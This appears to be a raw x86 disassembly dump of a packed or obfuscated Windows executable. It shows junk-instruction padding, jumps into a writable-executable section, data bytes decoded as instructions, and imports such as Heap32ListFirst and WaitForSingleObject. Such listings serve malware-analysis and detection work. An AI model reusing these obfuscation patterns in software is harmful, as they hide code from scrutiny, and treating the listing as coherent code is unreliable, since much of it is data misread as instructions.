add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_517bfe
cmp eax 0x7f
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
mov [ esp + 0x4 ] ch
pushad
int3
outsb
inc esp
jae rwxdata
0xda80
je rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
jbe rwxdata
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
outsb
pushad
jmp rwxdata
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
je rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
sub_517c79
lea esp [ esp + 0x8 ]
je rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
dec dl
and bl 0xd6
pushfd
mov ebx eax
rcl dl cl
rol dx cl
sub edx esi
mov edx [ ebx + 0x3c ]
pushad
stc
cmp ch dl
clc
add edx ebx
pushad
stc
mov edx [ edx + 0x80 ]
test bl 0x8a
push 0x859f002f
test edx edx
pushfd
lea esp [ esp + 0x4c ]
je rwxdata
call sub_516af7
sar di cl
pushad
add edx ebx
adc edi 0x3657802
add esp 0x20
jl rwxdata
cmc
rcl di cl
mov [ ebp - 0x4 ] edx
bsf dx si
mov edx [ ebp - 0x4 ]
bts edi 0x6
mov edi [ edx + 0x10 ]
cmp ax 0x9597
call sub_517dae
add [ eax ] al
dec edi
jo rwxdata
neg di
bsr di dx
mov [ ebp - 0x4 ] edx
sub dh 0xe4
mov edx [ ebp - 0x4 ]
bsf edi ebx
mov edi [ edx + 0x10 ]
stc
test al dl
bt cx di
test edi edi
push 0x37fec763
jmp rwxdata
jb rwxdata
outsb
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je rwxdata
jmp rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
je rwxdata
outsd
outsb
inc ecx
add [ eax ] al
add [ ebp + 0x65 ] ch
insd
insd
outsd
jbe rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
jmp rwxdata
outsb
inc esp
